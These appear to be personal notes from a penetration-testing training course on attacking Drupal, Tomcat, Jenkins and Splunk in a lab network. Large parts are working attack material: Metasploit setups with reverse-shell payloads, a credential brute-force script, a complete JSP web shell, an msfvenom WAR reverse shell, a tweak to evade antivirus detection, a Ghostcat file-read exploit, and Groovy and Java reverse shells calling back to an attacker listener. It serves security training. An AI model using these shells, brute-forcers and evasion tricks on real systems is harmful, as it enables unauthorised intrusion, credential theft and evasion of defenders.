	> Drupalgeddon3(https://github.com/rithchard/Drupalgeddon3) is an authenticated remote code execution vulnerability that affects multiple versions(https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.
		(https://academy.hackthebox.com/storage/modules/113/burp.png)

	> Once we have the session cookie, we can set up the exploit module as follows.

		msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
		msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
		msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
		msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
		msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
		msf6 exploit(multi/http/drupal_drupageddon3) > show options 

	> Module options (exploit/multi/http/drupal_drupageddon3):

   		Name            Current Setting                                                                   Required  Description
   		----            ---------------                                                                   --------  -----------
   		DRUPAL_NODE     1                                                                                 yes       Exist Node Number (Page, Article, Forum topic, or a Post)
   		DRUPAL_SESSION  SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  yes       Authenticated Cookie Session
   		Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   		RHOSTS          10.129.42.195                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   		RPORT           80                                                                                yes       The target port (TCP)
   		SSL             false                                                                             no        Negotiate SSL/TLS for outgoing connections
   		TARGETURI       /                                                                                 yes       The target URI of the Drupal installation
   		VHOST           drupal-acc.inlanefreight.local                                                    no        HTTP server virtual host

	> Payload options (php/meterpreter/reverse_tcp):
   		Name   Current Setting  Required  Description
   		----   ---------------  --------  -----------
   		LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   		LPORT  4444             yes       The listen port


	> Exploit target:
	   Id  Name
	   --  ----
	   0   User register form with exec
-=-=-=-=
[+] Tomcat - Discovery & Enumeration

	> Apache Tomcat is an open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts. However, its popularity increased in Java-based frameworks and is now widely used by frameworks such as Spring and tools such as Gradle. According to data gathered by BuiltWith(https://trends.builtwith.com/Web-Server/Apache-Tomcat-Coyote) there are over 220,000 live Tomcat websites at this time. Here are a few more interesting statistics:

    	- BuiltWith has gathered data that shows that over 904,000 websites have at one point been using Tomcat
    	- 1.22% of the top 1 million websites are using Tomcat, while 3.8% of the top 100k websites are
    	- Tomcat holds position # 13 for web servers by market share
    	- Some organizations that use Tomcat include Alibaba, the United States Patent and Trademark Office (USPTO), The American Red Cross, and the LA Times

	> Tomcat is often less apt to be exposed to the internet (though). We see it from time to time on external pentests and can make for an excellent foothold into the internal network. It is far more common to see Tomcat (and multiple instances, for that matter) during internal pentests. It'll usually occupy the first spot under "High Value Targets" within an EyeWitness report, and more often than not, at least one instance internal is configured with weak or default credentials. More on that later.

* Discovery/Footprinting

	> During our external penetration test, we run EyeWitness and see one host listed under "High Value Targets." The tool believes the host is running Tomcat, but we must confirm to plan our attacks. If we are dealing with Tomcat on the external network, this could be an easy foothold into the internal network environment.
	> Tomcat servers can be identified by the Server header in the HTTP response. If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version. Here we can see that Tomcat version 9.0.30 is in use.
	> Custom error pages may be in use that do not leak this version information. In this case, another method of detecting a Tomcat server and version is through the /docs page.

		m1l0js@htb[/htb]$ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 

			<html lang="en"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><link href="./images/docs-stylesheet.css" rel="stylesheet" type="text/css"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name="author" 
			<SNIP>

	> This is the default documentation page, which may not be removed by administrators. Here is the general folder structure of a Tomcat installation.

		├── bin
		├── conf
		│   ├── catalina.policy
		│   ├── catalina.properties
		│   ├── context.xml
		│   ├── tomcat-users.xml
		│   ├── tomcat-users.xsd
		│   └── web.xml
		├── lib
		├── logs
		├── temp
		├── webapps
		│   ├── manager
		│   │   ├── images
		│   │   ├── META-INF
		│   │   └── WEB-INF
		|   |       └── web.xml
		│   └── ROOT
		│       └── WEB-INF
		└── work
		    └── Catalina
		        └── localhost

	> The bin folder stores scripts and binaries needed to start and run a Tomcat server. The conf folder stores various configuration files used by Tomcat. The tomcat-users.xml file stores user credentials and their assigned roles. The lib folder holds the various JAR files needed for the correct functioning of Tomcat. The logs and temp folders store temporary log files. The webapps folder is the default webroot of Tomcat and hosts all the applications. The work folder acts as a cache and is used to store data during runtime.

	> Each folder inside webapps is expected to have the following structure.

		webapps/customapp
		├── images
		├── index.jsp
		├── META-INF
		│   └── context.xml
		├── status.xsd
		└── WEB-INF
		    ├── jsp
		    |   └── admin.jsp
		    └── web.xml
		    └── lib
		    |    └── jdbc_drivers.jar
		    └── classes
		        └── AdminServlet.class   

	> The most important file among these is WEB-INF/web.xml, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes. All compiled classes used by the application should be stored in the WEB-INF/classes folder. These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website. The lib folder stores the libraries needed by that particular application. The jsp folder stores Jakarta Server Pages (JSP => (https://en.wikipedia.org/wiki/Jakarta_Server_Pages)), formerly known as JavaServer Pages, which can be compared to PHP files on an Apache server.

	> Here’s an example web.xml file.
		Code: xml

		<?xml version="1.0" encoding="ISO-8859-1"?>

		<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

		<web-app>
		  <servlet>
		    <servlet-name>AdminServlet</servlet-name>
		    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
		  </servlet>

		  <servlet-mapping>
		    <servlet-name>AdminServlet</servlet-name>
		    <url-pattern>/admin</url-pattern>
		  </servlet-mapping>
		</web-app>   

	> The web.xml configuration above defines a new servlet named AdminServlet that is mapped to the class com.inlanefreight.api.AdminServlet. Java uses the dot notation to create package names, meaning the path on disk for the class defined above would be:
    	classes/com/inlanefreight/api/AdminServlet.class

	> Next, a new servlet mapping is created to map requests to /admin with AdminServlet. This configuration will send any request received for /admin to the AdminServlet.class class for processing. The web.xml descriptor holds a lot of sensitive information and is an important file to check when leveraging a Local File Inclusion (LFI) vulnerability.
	> The tomcat-users.xml file is used to allow or disallow access to the /manager and host-manager admin pages.
		Code: xml

		<?xml version="1.0" encoding="UTF-8"?>

		<SNIP>

		<tomcat-users xmlns="http://tomcat.apache.org/xml"
		              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
		              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
		              version="1.0">
		<!--
		  By default, no user is included in the "manager-gui" role required
		  to operate the "/manager/html" web application.  If you wish to use this app,
		  you must define such a user - the username and password are arbitrary.

		  Built-in Tomcat manager roles:
		    - manager-gui    - allows access to the HTML GUI and the status pages
		    - manager-script - allows access to the HTTP API and the status pages
		    - manager-jmx    - allows access to the JMX proxy and the status pages
		    - manager-status - allows access to the status pages only

		  The users below are wrapped in a comment and are therefore ignored. If you
		  wish to configure one or more of these users for use with the manager web
		  application, do not forget to remove the <!.. ..> that surrounds them. You
		  will also need to set the passwords to something appropriate.
		-->


		 <SNIP>

		!-- user manager can access only manager section -->
		<role rolename="manager-gui" />
		<user username="tomcat" password="tomcat" roles="manager-gui" />

		<!-- user admin can access manager and admin section both -->
		<role rolename="admin-gui" />
		<user username="admin" password="admin" roles="manager-gui,admin-gui" />


		</tomcat-users>

	> The file shows us what each of the roles manager-gui, manager-script, manager-jmx, and manager-status provide access to. In this example, we can see that a user tomcat with the password tomcat has the manager-gui role, and a second weak password admin is set for the user account admin

* Enumeration
	> After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the /manager and the /host-manager pages. We can attempt to locate these with a tool such as Gobuster or just browse directly to them.

		m1l0js@htb[/htb]$ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
			/docs (Status: 302)
			/examples (Status: 302)
			/manager (Status: 302)

We may be able to either log in to one of these using weak credentials such as tomcat:tomcat, admin:admin, etc. If these first few tries don't work, we can try a password brute force attack against the login page, covered in the next section. If we are successful in logging in, we can upload a Web Application Resource or Web Application ARchive (WAR => (https://en.wikipedia.org/wiki/WAR_(file_format)#:~:text=In%20software%20engineering%2C%20a%20WAR,that%20together%20constitute%20a%20web)) file containing a JSP web shell and obtain remote code execution on the Tomcat server.

Now that we've learned about the structure and function of Tomcat let's attack it by abusing built-in functionality and exploiting a well-known vulnerability that affected specific versions of Tomcat.

-=-=-=-=
[+] Attacking Tomcat

	> We've identified that there is indeed a Tomcat host exposed externally by our client. As the scope of the assessment is relatively small and all of the other targets are not particularly interesting, let's turn our full attention to attempting to gain internal access via Tomcat.
	> As discussed in the previous section, if we can access the /manager or /host-manager endpoints, we can likely achieve remote code execution on the Tomcat server. Let's start by brute-forcing the Tomcat manager page on the Tomcat instance at http://web01.inlanefreight.local:8180. We can use the auxiliary/scanner/http/tomcat_mgr_login Metasploit module for these purposes, Burp Suite Intruder or any number of scripts to achieve this. We'll use Metasploit for our purposes.

* Tomcat Manager - Login Brute Force
	> We first have to set a few options. Again, we must specify the vhost and the target's IP address to interact with the target properly. We should also set STOP_ON_SUCCESS to true so the scanner stops when we get a successful login, no use in generating loads of additional requests after a successful login.

		msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
		msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
		msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
		msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58

	> As always, we check to make sure everything is set up correctly by show options.

		msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options 

			Module options (auxiliary/scanner/http/tomcat_mgr_login):

			   Name              Current Setting                                                                 Required  Description
			   ----              ---------------                                                                 --------  -----------
			   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users
			   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5
			   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database
			   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list
			   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list
			   PASSWORD                                                                                          no        The HTTP password to specify for authentication
			   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
			   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
			   RHOSTS            10.129.201.58                                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
			   RPORT             8180                                                                            yes       The target port (TCP)
			   SSL               false                                                                           no        Negotiate SSL/TLS for outgoing connections
			   STOP_ON_SUCCESS   true                                                                            yes       Stop guessing when a credential works for a host
			   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html
			   THREADS           1                                                                               yes       The number of concurrent threads (max one per host)
			   USERNAME                                                                                          no        The HTTP username to specify for authentication
			   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
			   USER_AS_PASS      false                                                                           no        Try the username as the password for all users
			   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
			   VERBOSE           true                                                                            yes       Whether to print output for all attempts
			   VHOST             web01.inlanefreight.local                                                       no        HTTP server virtual host

	> We hit run and get a hit for the credential pair tomcat:admin.

	> It is important to note that there are many tools available to us as penetration testers. Many exist to make our work more efficient, especially since most penetration tests are "time-boxed" or under strict time constraints. No one tool is better than another, and it does not make us a "bad" penetration tester if we use certain tools like Metasploit to our advantage. Provided we understand each scanner and exploit script that we run and the risks, then utilizing this scanner properly is no different from using Burp Intruder or writing a custom Python script. Some say, "work smarter, not harder." Why would we make extra work for ourselves during a 40-hour assessment with 1,500 in-scope hosts when we can use a particular tool to help us? It is vital for us to understand how our tools work and how to do many things manually. We could manually try each credential pair in the browser or script this using cURL or Python if we choose. At the very least, if we decide to use a certain tool, we should be able to explain its usage and potential impact to our clients should they question us during or after the assessment.
	> Let's say a particular Metasploit module (or another tool) is failing or not behaving the way we believe it should. We can always use Burp Suite or ZAP to proxy the traffic and troubleshoot. To do this, first, fire up Burp Suite and then set the PROXIES option like the following:

		msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080


	> We can see in Burp exactly how the scanner is working, taking each credential pair and base64 encoding into account for basic auth that Tomcat uses.
	> A quick check of the value in the Authorization header for one request shows that the scanner is running correctly, base64 encoding the credentials admin:vagrant the way the Tomcat application would do when a user attempts to log in directly from the web application. Try this out for some examples throughout this module to start getting comfortable with debugging through a proxy.

		m1l0js@htb[/htb]$ echo YWRtaW46dmFncmFudA== |base64 -d
			admin:vagrant

	> We can also use this(https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) Python script to achieve the same result.
		Code: python

		#!/usr/bin/python

		import requests
		from termcolor import cprint
		import argparse

		parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

		parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
		parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
		parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
		parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

		args = parser.parse_args()

		url = args.url
		uri = args.path
		users_file = args.usernames
		passwords_file = args.passwords

		new_url = url + uri
		f_users = open(users_file, "rb")
		f_pass = open(passwords_file, "rb")
		usernames = [x.strip() for x in f_users]
		passwords = [x.strip() for x in f_pass]

		cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

		for u in usernames:
		    for p in passwords:
		        r = requests.get(new_url,auth = (u, p))

		        if r.status_code == 200:
		            cprint("\n[+] Success!!", "green", attrs = ['bold'])
		            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
		            break
		    if r.status_code == 200:
		        break

		if r.status_code != 200:
		    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
		    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
		#print r.status_code

	> This is a very straightforward script that takes a few arguments. We can run the script with -h to see what it requires to run.
		m1l0js@htb[/htb]$ python3 mgr_brute.py  -h

	> We can try out the script with the default Tomcat users and passwords file that the above Metasploit module uses. We run it and get a hit!
		m1l0js@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt


* Tomcat Manager - WAR File Upload

	> Many Tomcat installations provide a GUI interface to manage the application. This interface is available at /manager/html by default, which only users assigned the manager-gui role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage.
	> After performing a brute force attack and answering questions 1 and 2 below, browse to http://web01.inlanefreight.local:8180/manager/html and enter the credentials.
	> The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility. A JSP web shell such as this(https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) can be downloaded and placed within the archive.
		Code: java

		<%@ page import="java.util.*,java.io.*"%>
		<%
		//
		// JSP_KIT
		//
		// cmd.jsp = Command Execution (unix)
		//
		// by: Unknown
		// modified: 27/06/2003
		//
		%>
		<HTML><BODY>
		<FORM METHOD="GET" NAME="myform" ACTION="">
		<INPUT TYPE="text" NAME="cmd">
		<INPUT TYPE="submit" VALUE="Send">
		</FORM>
		<pre>
		<%
		if (request.getParameter("cmd") != null) {
		        out.println("Command: " + request.getParameter("cmd") + "<BR>");
		        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
		        OutputStream os = p.getOutputStream();
		        InputStream in = p.getInputStream();
		        DataInputStream dis = new DataInputStream(in);
		        String disr = dis.readLine();
		        while ( disr != null ) {
		                out.println(disr); 
		                disr = dis.readLine(); 
		                }
		        }
		%>
		</pre>
		</BODY></HTML>

		m1l0js@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
		m1l0js@htb[/htb]$ zip -r backup.war cmd.jsp 

	> Click on Browse to select the .war file and then click on Deploy.

	> This file is uploaded to the manager GUI, after which the /backup application will be added to the table.
	> If we click on backup, we will get redirected to http://web01.inlanefreight.local:8180/backup/ and get a 404 Not Found error. We need to specify the cmd.jsp file in the URL as well. Browsing to http://web01.inlanefreight.local:8180/backup/cmd.jsp will present us with a web shell that we can use to run commands on the Tomcat server. From here, we could upgrade our web shell to an interactive reverse shell and continue. Like previous examples, we can interact with this web shell via the browser or using cURL on the command line. Try both!

		m1l0js@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
			<HTML><BODY>
			<FORM METHOD="GET" NAME="myform" ACTION="">
			<INPUT TYPE="text" NAME="cmd">
			<INPUT TYPE="submit" VALUE="Send">
			</FORM>
			<pre>
			Command: id<BR>
			uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

			</pre>
			</BODY></HTML>

	> To clean up after ourselves, we can go back to the main Tomcat Manager page and click the Undeploy button next to the backups application after, of course, noting down the file and upload location for our report, which in our example is /opt/tomcat/apache-tomcat-10.0.10/webapps. If we do an ls on that directory from our web shell, we'll see the uploaded backup.war file and the backup directory containing the cmd.jsp script and META-INF created after the application deploys. Clicking on Undeploy will typically remove the uploaded WAR archive and the directory associated with the application.
	
	> We could also use msfvenom to generate a malicious WAR file. The payload java/jsp_shell_reverse_tcp will execute a reverse shell through a JSP file. Browse to the Tomcat console and deploy this file. Tomcat automatically extracts the WAR file contents and deploys it.
		m1l0js@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

	> Start a Netcat listener and click on /backup to execute the shell.
		m1l0js@htb[/htb]$ nc -lnvp 4443

	> The multi/http/tomcat_mgr_upload Metasploit module can be used to automate the process shown above, but we'll leave this as an exercise for the reader.
	> This(https://github.com/SecurityRiskAdvisors/cmd.jsp) JSP web shell is very lightweight (under 1kb) and utilizes a Bookmarklet(https://www.freecodecamp.org/news/what-are-bookmarklets/) or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded cmd.jsp would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit).
	> The web shell as is only gets detected by 2/58 anti-virus vendors.

	> A simple change such as changing:
		Code: java
		FileOutputStream(f);stream.write(m);o="Uploaded:

	> to:
		Code: java
		FileOutputStream(f);stream.write(m);o="uPlOaDeD:

	> results in 0/58 security vendors flagging the cmd.jsp file as malicious at the time of writing.
	
* A Quick Note on Web shells

	> When we upload web shells (especially on externals), we want to prevent unauthorized access. We should take certain measures such as a randomized file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it. We don't want an attacker to come across our web shell and leverage it to gain their own foothold.

* CVE-2020-1938 : Ghostcat
	> Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named Ghostcat(https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938). All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable. This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat. AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in proxying requests to application servers behind the front-end web servers.
	> The AJP service is usually running at port 8009 on a Tomcat server. This can be checked with a targeted Nmap scan.
		m1l0js@htb[/htb]$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local
			PORT     STATE SERVICE VERSION
			8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
			8080/tcp open  http    Apache Tomcat 9.0.30

	> The above scan confirms that ports 8080 and 8009 are open. The PoC code for the vulnerability can be found here(https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi). Download the script and save it locally. The exploit can only read files and folders within the web apps folder, which means that files like /etc/passwd can’t be accessed. Let’s attempt to access the web.xml. In some Tomcat installs, we may be able to access sensitive data within the WEB-INF file.
		m1l0js@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 

* Moving On
	> Tomcat is always a great find on internal and external penetration tests. Whenever we come across it, we should test the Tomcat Manager area for weak/default credentials. If we can log in, we can quickly turn this access into remote code execution. It’s common to find Tomcat running as high-privileged users such as SYSTEM or root, so it is always worth digging into as it could provide us with a privileged foothold on a Linux server or a domain-joined Windows server in an Active Directory environment.

-=-=-=-=-==
[+] Jenkins - Discovery & Enumeration

	> Jenkins is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat. Over the years, researchers have uncovered various vulnerabilities in Jenkins, including some that allow for remote code execution without requiring authentication. Jenkins is a continuous integration server. Here are a few interesting points about Jenkins:

    	- Jenkins was originally named Hudson (released in 2005) and was renamed in 2011 after a dispute with Oracle
    	- Data shows that over 86,000 companies use Jenkins
    	- Jenkins is used by well-known companies such as Facebook, Netflix, Udemy, Robinhood, and LinkedIn
    	- It has over 300 plugins to support building and testing projects

* Discovery/Footprinting

	> Let's assume we are working on an internal penetration test and have completed our web discovery scans. We notice what we believe is a Jenkins instance and know it is often installed on Windows servers running as the all-powerful SYSTEM account. If we can gain access via Jenkins and gain remote code execution as the SYSTEM account, we would have a foothold in Active Directory to begin enumeration of the domain environment.
	> Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers. This port is used to communicate between masters and slaves. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts.

* Enumeration
	> The default installation typically uses Jenkins’ database to store credentials and does not allow users to register an account. We can fingerprint Jenkins quickly by the telltale login page.
	> We may encounter a Jenkins instance that uses weak or default credentials such as admin:admin or does not have any type of authentication enabled. It is not uncommon to find Jenkins instances that do not require any authentication during an internal penetration test. While rare, we have come across Jenkins during external penetration tests that we were able to attack.

-=-=
[+] Attacking Jenkins

	> We've confirmed that the host is running Jenkins, and it is configured with weak credentials. Let's check and see what type of access this will give us.
	> Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the Script Console(https://www.jenkins.io/doc/book/managing/script-console/). The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime. This can be abused to run operating system commands on the underlying server. Jenkins is often installed in the context of the root or SYSTEM account, so it can be an easy win for us.

* Script Console

	> The script console can be reached at the URL http://jenkins.inlanefreight.local:8000/script. This console allows a user to run Apache Groovy scripts, which are an object-oriented Java-compatible language. The language is similar to Python and Ruby. Groovy source code gets compiled into Java Bytecode and can run on any platform that has JRE installed.
	> Using this script console, it is possible to run arbitrary commands, functioning similarly to a web shell. For example, we can use the following snippet to run the id command.

		Code: groovy
		def cmd = 'id'
		def sout = new StringBuffer(), serr = new StringBuffer()
		def proc = cmd.execute()
		proc.consumeProcessOutput(sout, serr)
		proc.waitForOrKill(1000)
		println sout

	> There are various ways that access to the script console can be leveraged to gain a reverse shell. For example, using the command below, or this(https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console) Metasploit module.
		Code: groovy

		r = Runtime.getRuntime()
		p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
		p.waitFor()

	> Running the above commands results in a reverse shell connection.
		m1l0js@htb[/htb]$ nc -lvnp 8443

	> Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with Invoke-PowerShellTcp.ps1(https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). We could run commands on a Windows-based Jenkins install using this snippet:
		Code: groovy
		
		def cmd = "cmd.exe /c dir".execute();
		println("${cmd.text}");

	> We could also use this(https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Java reverse shell to gain command execution on a Windows host, swapping out localhost and the port for our IP address and listener port.
		Code: groovy

		String host="localhost";
		int port=8044;
		String cmd="cmd.exe";
		Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

* Miscellaneous Vulnerabilities

	> Several remote code execution vulnerabilities exist in various versions of Jenkins. One recent exploit combines two vulnerabilities, CVE-2018-1999002 and CVE-2019-1003000(https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) to achieve pre-authenticated remote code execution, bypassing script security sandbox protection during script compilation. Public exploit PoCs exist to exploit a flaw in Jenkins dynamic routing to bypass the Overall / Read ACL and use Groovy to download and execute a malicious JAR file. This flaw allows users with read permissions to bypass sandbox protections and execute code on the Jenkins master server. This exploit works against Jenkins version 2.137.
	> Another vulnerability exists in Jenkins 2.150.2, which allows users with JOB creation and BUILD privileges to execute code on the system via Node.js. This vulnerability requires authentication, but if anonymous users are enabled, the exploit will succeed because these users have JOB creation and BUILD privileges by default.
	> As we have seen, gaining access to Jenkins as an administrator can quickly lead to remote code execution. While several working RCE exploits exist for Jenkins, they are version-specific. At the time of writing, the current LTS release of Jenkins is 2.303.1, which fixes the two flaws detailed above. As with any application or system, it is important to harden Jenkins as much as possible since built-in functionality can be easily used to take over the underlying server.

-=-=-
[+] Splunk - Discovery & Enumeration

	> Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk deployments are often used to house sensitive data and could provide a wealth of information for an attacker if compromised. Historically, Splunk has not suffered from many known vulnerabilities aside from an information disclosure vulnerability (CVE-2018-11409) and an authenticated remote code execution vulnerability in very old versions (CVE-2011-4642). Here are a few details about Splunk:

    	- Splunk was founded in 2003, first became profitable in 2009, and had its initial public offering (IPO) in 2012 on NASDAQ under the symbol SPLK
    	- Splunk has over 7,500 employees and annual revenue of nearly $2.4 billion
    	- In 2020, Splunk was named to the Fortune 1000 list
    	- Splunk's clients include 92 companies on the Fortune 100 list
    	- Splunkbase(https://splunkbase.splunk.com/) allows Splunk users to download apps and add-ons for Splunk. As of 2021, there are over 2,000 available apps

	> We will more often than not see Splunk during our assessments, especially in large corporate environments during internal penetration tests. We have seen it exposed externally, but this is rarer. Splunk does not suffer from many exploitable vulnerabilities and is quick to patch any issues. The biggest focus of Splunk during an assessment would be weak or null authentication because admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server and possibly other hosts in the network depending on the way Splunk is set up.
	
* Discovery/Footprinting
	> Splunk is prevalent in internal networks and often runs as root on Linux or SYSTEM on Windows systems. While uncommon, we may encounter Splunk externally facing at times. Let's imagine that we uncover a forgotten instance of Splunk in our Aquatone report that has since automatically converted to the free version, which does not require authentication. Since we have yet to gain a foothold in the internal network, let's focus our attention on Splunk and see if we can turn this access into RCE.

	> The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are admin:changeme, which are conveniently displayed on the login page.
	> The latest version of Splunk sets credentials during the installation process. If the default credentials do not work, it is worth checking for common weak passwords such as admin, Welcome, Welcome1, Password123, etc.

	> We can discover Splunk with a quick Nmap service scan. Here we can see that Nmap identified the Splunkd httpd service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API.

		m1l0js@htb[/htb]$ sudo nmap -sV 10.129.201.50

			PORT     STATE SERVICE       VERSION
			80/tcp   open  http          Microsoft IIS httpd 10.0
			135/tcp  open  msrpc         Microsoft Windows RPC
			139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
			445/tcp  open  microsoft-ds?
			3389/tcp open  ms-wbt-server Microsoft Terminal Services
			5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
			8000/tcp open  ssl/http      Splunkd httpd
			8080/tcp open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
			8089/tcp open  ssl/http      Splunkd httpd

* Enumeration

	> The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication. It is not uncommon for system administrators to install a trial of Splunk to test it out, which is subsequently forgotten about. This will automatically convert to the free version that does not have any form of authentication, introducing a security hole in the environment. Some organizations may opt for the free version due to budget constraints, not fully understanding the implications of having no user/role management.

	> Once logged in to Splunk (or having accessed an instance of Splunk Free), we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications.
	> Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining remote code execution on a Splunk server is through the use of a scripted input. These are designed to help integrate Splunk with data sources such as APIs or file servers that require custom methods to access. Scripted inputs are intended to run these scripts, with STDOUT provided as input to Splunk.
